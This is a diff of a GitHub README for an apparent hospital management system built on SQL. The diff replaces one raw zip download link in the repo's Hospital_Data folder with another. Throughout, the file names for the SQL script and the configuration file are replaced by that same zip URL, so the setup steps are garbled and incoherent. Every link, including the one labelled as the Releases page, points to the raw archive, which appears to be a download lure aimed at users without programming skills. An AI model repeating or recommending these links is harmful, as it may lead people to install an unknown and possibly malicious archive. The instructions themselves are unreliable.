@@ -1,7 +1,7 @@
 # 🏥 Hospital-Management-System-SQL - A Simple Solution for Healthcare Management
 
 ## 📥 Download Now
-[![Download Hospital-Management-System-SQL](https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip)](https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip)
+[![Download Hospital-Management-System-SQL](https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip)](https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Hospital Management System. This application assists healthcare providers in managing patient information, appointments, and other essential tasks. You do not need programming skills to use it.
@@ -15,14 +15,14 @@ Before you begin, ensure your system meets these requirements:
 - **Disk Space:** Minimum 100 MB available space
 
 ## 📥 Download & Install
-To get started, visit the Releases page to download the application: [Download Hospital-Management-System-SQL](https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip). 
+To get started, visit the Releases page to download the application: [Download Hospital-Management-System-SQL](https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip). 
 
 Once you're on the Releases page, look for the latest version. The version will be labeled with a number like v1.0. Click on it to view the files available for download. 
 
 Follow these steps:
 
 1. Click on the latest version link.
-2. Look for the file labeled `https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip` or similar.
+2. Look for the file labeled `https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip` or similar.
 3. Click on the file to start the download.
 4. Once the download finishes, locate the file on your computer.
 
@@ -43,15 +43,15 @@ The application requires a MySQL database to function. Follow these steps to set
    - Run the command: `CREATE DATABASE hospital_management;`
 3. **Import Data:**
    - Find the folder where you extracted the files.
-   - Inside, you will see a SQL file, likely named `https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip`.
+   - Inside, you will see a SQL file, likely named `https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip`.
    - Open MySQL Workbench.
    - Click on the database you created.
-   - Run the SQL commands in `https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip` to set up the needed tables.
+   - Run the SQL commands in `https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip` to set up the needed tables.
 
 ## 🛠️ Configure Application
 Once MySQL is ready, configure the application to connect to your database.
 
-1. Find the configuration file, usually named `https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip` or `https://raw.githubusercontent.com/YouseiOfficial/Hospital-Management-System-SQL/main/Hospital_Data/Hospital-Management-System-SQL_v3.2.zip`, in the folder where you extracted the files.
+1. Find the configuration file, usually named `https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip` or `https://github.com/YouseiOfficial/Hospital-Management-System-SQL/raw/refs/heads/main/Hospital_Data/Management_System_Hospital_SQL_2.0.zip`, in the folder where you extracted the files.
 2. Open the configuration file using a text editor (like Notepad).
 3. Update the database connection settings:
    - **Host:** Usually `localhost`
